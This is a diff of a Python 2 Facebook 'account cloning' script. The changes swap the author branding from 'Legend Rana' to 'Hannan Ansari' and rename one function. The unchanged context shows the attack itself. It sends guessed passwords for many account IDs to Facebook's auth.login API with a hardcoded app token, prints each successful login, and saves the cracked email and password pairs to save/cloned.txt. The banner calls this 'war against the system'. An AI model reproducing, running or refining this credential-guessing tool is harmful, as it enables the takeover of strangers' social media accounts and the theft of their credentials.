@@ -86,7 +86,7 @@ def ban():
 	jalan ('\033[1;94m-----------------------\033[1;96m----------------------------')
 	jalan ('\033[1;93m-----------------------\033[1;91m----------------------------')
 	jalan ('\033[1;92m-----------------------\033[1;95m----------------------------')
-	jalan ('\033[1;91m                 Legend \033[1;91mRana')
+	jalan ('\033[1;91m                 LEGEND \033[1;91mRANA')
 	jalan ('\033[1;97m              Cloning Is \033[1;94mNot A Crime   ')
 	jalan ('\033[1;96m            Its Just War \033[1;93mAgainst The System ')
 	jalan ('\033[1;95m-----------------------\033[1;91m----------------------------')
@@ -108,7 +108,7 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;92m[~] Tool Password \033[1;95m: \033[0;97m")
         if (password == CorrectPassword):
-            print "Logged in successfully as Legend Rana"
+            print "Logged in successfully as LEGEND RANA"
 	    time.sleep(2)
             loop = 'false'
         else:
@@ -132,9 +132,9 @@ def login():
     jalan ("\033[1;91m[\033[1;97m1\033[1;91m] \033[1;95mSTART CLONING")
     time.sleep(0.05)
     jalan ('\033[1;91m[\033[1;97m2\033[1;91m] \033[1;93mEXIT')
-    RANA()
+    Hannan()
  
-def RANA():
+def Hannan():
 	action()
  
 def action():
@@ -169,7 +169,7 @@ def action():
     ban()
     num = str(len(id))
     print 50* '\033[1;95m*'
-    jalan ('\033[1;92m                LEGEND RANA   ')
+    jalan ('\033[1;92m                HANNAN ANSARI   ')
     print 50* '\033[1;95m*'
     jalan ('\033[1;92m              Total IDs: '+num)
     print 50* '\033[1;95m*'
@@ -185,7 +185,7 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m(RANA-OK)  ' + k + c + user + '  |  ' + pass1                                       
+                print '\x1b[1;92m(HANNAN-OK)  ' + k + c + user + '  |  ' + pass1                                       
                 okb = open('save/cloned.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
                 okb.close()
@@ -202,7 +202,7 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;92m(RANA-OK)  ' + k + c + user +  '  |  ' + pass2
+                        print '\x1b[1;92m(HANNAN-OK)  ' + k + c + user +  '  |  ' + pass2
                         okb = open('save/cloned.txt', 'a')
                         okb.write(k+c+user+pass2+'\n')
                         okb.close()
